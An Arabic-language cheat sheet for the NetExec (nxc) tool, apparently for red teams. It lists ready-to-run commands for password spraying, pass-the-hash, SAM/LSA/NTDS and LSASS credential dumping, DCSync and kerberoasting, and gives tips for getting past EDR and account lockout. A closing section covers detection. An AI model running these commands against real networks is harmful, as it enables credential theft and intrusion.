# CrackMapExec / NetExec (nxc) — الدليل الكامل للتعامل مع الشبكات المؤسسية

تُعتبر أداة `nxc` (المعروفة سابقاً بـ NetExec) الوريث النشط والمطور لأداة `CrackMapExec`. وهي بمثابة "السكين السويسري" لفرق الحمراء (Red Teams) والمختبرين، حيث توفر قدرات هائلة في الاستطلاع (Enumeration)، والمصادقة، والتنقل الجانبي (Pivoting) داخل شبكات Windows عبر بروتوكولات متعددة مثل SMB, WinRM, RDP, MSSQL, FTP, SSH, و LDAP.

> [!info] ملاحظة: CrackMapExec أصبحت قديمة
> تجنب تثبيت `crackmapexec` من مستودعات PyPI لأن تطويرها توقف عند إصدار قديم. استخدم `nxc` من مستودع NetExec الرسمي؛ فهي تحتفظ بنفس بناء الجملة (Syntax) مع تحديث كامل للوحدات والوظائف.

## التثبيت (Install)

```terminal
pipx install netexec
# أو من المستودع مباشرة
git clone https://github.com/Pennyw0rth/NetExec && cd NetExec && pip install -e .
```

## البروتوكولات المدعومة (Protocols)

```terminal
nxc smb       # SMB (الأكثر استخداماً)
nxc winrm     # WinRM للتحكم عن بعد
nxc ldap      # LDAP / Kerberos لاستطلاع الدليل النشط
nxc mssql     # قواعد بيانات MSSQL
nxc rdp       # بروتوكول سطح المكتب البعيد
nxc ftp / ssh / vnc / nfs
```

## الهيكل العام للاستخدام (Standard usage shape)

```terminal
nxc <protocol> <target(s)> [-u user] [-p pass | -H hash] [-d domain] [options]
```

يمكن أن تكون الأهداف: عنوان IP واحد، نطاق (CIDR)، ملف أهداف (`-t targets.txt`)، أو اسم النطاق بالكامل.

## خيارات المصادقة (Authentication options)

| الخيار (Flag) | طريقة المصادقة |
|------|-------------|
| `-u alice -p 'Pass1'` | نص واضح (Plaintext) |
| `-u alice -H aad3b435...:5e5a...` | تمرير الهاش (Pass-the-hash) |
| `-u alice --aesKey <key>` | مفاتيح Kerberos AES |
| `-u alice -k --use-kcache` | استخدام Kerberos عبر ccache |
| `-u alice -p Pass1 -d corp.local` | مصادقة النطاق (Domain auth) |
| `-u 'corp.local\\alice' -p Pass1` | صياغة بديلة لمصادقة النطاق |
| `--local-auth` | مصادقة كمستخدم محلي، وليس مستخدم نطاق |
| `-u user.txt -p pass.txt` | هجوم الرش (Password Spraying) |
| `--continue-on-success` | الاستمرار في الفحص بعد نجاح أول عملية مصادقة |

## الاستطلاع بدون بيانات اعتماد (Enumeration no creds)

| الخيار | التأثير |
|--------|--------|
| (بدون بيانات) | مجرد تشغيل `nxc smb 10.0.0.0/24` يظهر نظام التشغيل، التوقيع الرقمي (Signing)، بروتوكول SMBv1، والجلسات الفارغة |
| `--shares` | سرد مشاركات SMB (المتاحة للجميع أو للجلسات الفارغة) |
| `--users / --groups / --pass-pol` | جلب المستخدمين / المجموعات / سياسة كلمة المرور عبر SAMR |
| `--rid-brute` | استطلاع المستخدمين عبر تخمين SID (يعمل أحياناً بدون مصادقة) |
| `--sessions` | عرض الجلسات النشطة على المضيف |
| `--loggedon-users` | عرض قائمة المستخدمين المسجلين دخولهم حالياً |

## خيارات ما بعد المصادقة (Post-auth options)

| الخيار | التأثير |
|--------|--------|
| `-x 'whoami'` | تشغيل أمر (باستخدام smbexec/winrm) |
| `-X 'powershell -ec ...'` | تشغيل أوامر PowerShell مشفرة |
| `--exec-method smbexec|wmiexec|atexec|mmcexec` | اختيار قناة التنفيذ |
| `--sam` | استخراج ملف SAM (الهاشات المحلية) |
| `--lsa` | استخراج أسرار LSA |
| `--ntds` | استخراج NTDS.dit (DCSync — يتطلب صلاحيات Domain Admin أو ما يعادلها) |
| `--ntds drsuapi|vss` | تحديد طريقة استخراج ntds |
| `--users` (بعد المصادقة) | استطلاع تفصيلي لمستخدمي النطاق |
| `--shares` (بعد المصادقة) | عرض المشاركات مع الأذونات الخاصة بكل مستخدم |
| `--spider <share> --pattern <regex>` | الزحف داخل مشاركات SMB للبحث عن ملفات معينة |
| `--gen-relay-list <file>` | توليد قائمة بالمضيفين الذين لا يفرضون التوقيع (لهجمات NTLM Relay) |

## الوحدات (Modules)

```terminal
nxc smb -L           # عرض قائمة الوحدات (أكثر من 200 وحدة)
nxc smb 10.0.0.5 -u alice -p Pass1 -M <module> -o KEY=val
```

أبرز الوحدات:

| الوحدة | الوظيفة |
|--------|--------------|
| `enum_av` | معرفة برنامج مكافحة الفيروسات النشط |
| `enum_chrome` | استخراج بيانات الاعتماد المشفرة من Chrome |
| `lsassy` | استخراج محتويات ذاكرة LSASS عن بعد |
| `mimikatz` | تشغيل Mimikatz وتحليل مخرجاته |
| `bh_owned` | وضع علامة "تم الاستيلاء" على المضيفات في BloodHound |
| `wcc` | مدقق إعدادات أمان Windows (Windows Configuration Checker) |
| `gpp_password` | فك تشفير كلمات المرور من ملفات GPP |
| `petitpotam` / `coercer` | إجبار النظام على إجراء مصادقة NTLM (Coercion) |
| `add-computer` | استغلال سياسة MS-DS-MachineAccountQuota |
| `rdcheck` | التحقق من بيانات الاعتماد عبر بروتوكول RDP |

## مسارات العمل (Workflows)

### فحص شبكة كاملة بدون بيانات اعتماد

```terminal
nxc smb 10.0.0.0/24
# يعطيك صورة شاملة عن أنظمة التشغيل وحالة التوقيع (Signing) والأسماء
```

### رش كلمات المرور عبر النطاق

```terminal
nxc smb 10.0.0.0/24 -u 'alice' -p 'Spring2026!' --continue-on-success
nxc smb 10.0.0.0/24 -u users.txt -p 'Spring2026!' --continue-on-success
```

### استخدام الهاشات المسروقة (Pass-the-Hash)

```terminal
nxc smb 10.0.0.0/24 -u alice -H aad3b435...:5e5a... --continue-on-success
```

### تأكيد صلاحيات مدير النطاق عبر DCSync

```terminal
nxc smb dc01.corp.local -u domain-admin -p Pass1 --ntds
# أو باستخدام الهاش إذا كان متوفراً:
nxc smb dc01.corp.local -u domain-admin -H <NT> --ntds
```

### البحث عن ملفات حساسة داخل المشاركات

```terminal
nxc smb 10.0.0.0/24 -u alice -p Pass1 -M spider_plus -o EXTENSIONS='xml,txt,docx,zip' READ_ONLY=true
```

### تنفيذ الهجمات المستندة إلى Kerberos عبر LDAP

```terminal
nxc ldap dc01 -u alice -p Pass1 --kerberoasting krb.txt
nxc ldap dc01 -u alice -p Pass1 --asreproast asrep.txt
```

## أبرز مخرجات الأداة (Good output)

تستخدم الأداة ترميزاً لونياً لتسهيل القراءة:

- الأخضر `[+]` = نجاح المصادقة.
- البنفسجي `(Pwn3d!)` = المستخدم يملك صلاحيات مدير محلي (Local Admin) — هدف ذو قيمة عالية.
- الأحمر `[-]` = فشل العملية.

```
SMB         10.0.0.5     445   FILESRV  [+] CORP\alice:Pass1 (Pwn3d!)
SMB         10.0.0.6     445   APP01    [+] CORP\alice:Pass1
SMB         10.0.0.7     445   DC01     [+] CORP\alice:Pass1
LDAP        10.0.0.7     389   DC01     [+] [Kerberoast] svc_sql:$krb5tgs$23$*svc_sql$CORP.LOCAL$svc_sql*$...
```

ظهور `(Pwn3d!)` يعني أن خطوتك القادمة هي استخدام `--sam` لجمع المزيد من الهاشات المحلية.

## المشاكل التقنية والحلول (Bad output and fixes)

| العرض (Symptom) | السبب المحتمل | الحل |
|---------|-------|-----|
| `STATUS_LOGON_FAILURE` في كل مكان | بيانات أو نطاق خاطئ | تأكد من اسم النطاق؛ جرب `--local-auth` للحسابات المحلية |
| `STATUS_PASSWORD_MUST_CHANGE` | الحساب يتطلب تغيير كلمة المرور | المصادقة نجحت تقنياً، ولكن لا يمكن المتابعة بدون تغييرها |
| `connection refused` من مضيفين كثيرين | تصفية بروتوكول SMB (جدران نارية) | جرب WinRM (`nxc winrm ...`) أو LDAP |
| هجوم الرش يتسبب في قفل الحسابات | سياسة القفل الذكي (Smart-lockout) | استخدم التأخير `-d`؛ لا تزد عن محاولة أو اثنتين في الساعة لكل مستخدم |
| فشل `--ntds` بـ `RPC_S_ACCESS_DENIED` | صلاحيات غير كافية | تحتاج صلاحيات Replicate Directory Changes؛ جرب طريقة vss |
| `Pwn3d!` موجود ولكن التنفيذ `-x` يفشل | نظام EDR يحظر طريقة التنفيذ | جرب `--exec-method atexec` أو `mmcexec` |

## منظور الدفاع (Defender's perspective)

تولد أداة NetExec كمية هائلة من التنبيهات (Telemetry):

- سجلات 4624 / 4625 لعمليات الدخول عبر مضيفين متعددين من مصدر واحد — نمط هجوم الرش.
- عمليات كتابة في `ADMIN$` لملفات الخدمة الخاصة بـ smbexec / wmiexec بأسماء عشوائية قصيرة.
- طلبات TGS-REQ (حدث 4769) لعدد كبير من حسابات الخدمة (Kerberoast).
- رشقات من استعلامات LDAP.

استراتيجيات الكشف:
- استخدام Microsoft Defender for Identity لرصد "فشل مصادقة مشبوه" أو محاولات "DC Sync".
- قواعد Sigma لرصد أنماط أسماء خدمات `wmiexec` / `smbexec`.
- حسابات "Honeytokens" في AD: أي محاولة مصادقة لحساب وهمي مثل `svc_admin_old` تعتبر دليلاً قاطعاً على نشاط معادي.

## أمن العمليات (OPSEC)

- استخدم دائماً `--continue-on-success` عند هجمات الرش لضمان عدم التوقف عند أول نجاح.
- لا تقم بتشغيل `--ntds` عبر `drsuapi` من مضيف ليس مدير نظام — هذا "أصخب" إجراء يمكن اتخاذه.
- العديد من الوحدات تقوم برفع ملفات Mimikatz / lsassy؛ أنظمة EDR الحديثة ستصطادها فوراً. استخدم تقنيات BYOD (مثل التعريفات الموقعة) فقط عند الحصول على إذن صريح.

## أدوات ذات صلة (Related tools)

| الأداة | التخصص |
|------|-------|
| **Impacket** | المحرك الأساسي (يستخدمه nxc داخلياً) مثل `secretsdump` و `wmiexec` |
| **Rubeus** | التعامل المتقدم مع بروتوكول Kerberos (من جهة Windows) |
| **Mimikatz** | استخراج بيانات الاعتماد محلياً |
| **Certipy** | استهداف خدمات شهادات الدليل النشط (AD CS) |
| **PingCastle** | تدقيق الوضع الأمني للدليل النشط |
| **adidnsdump** | استخراج سجلات DNS عبر LDAP |
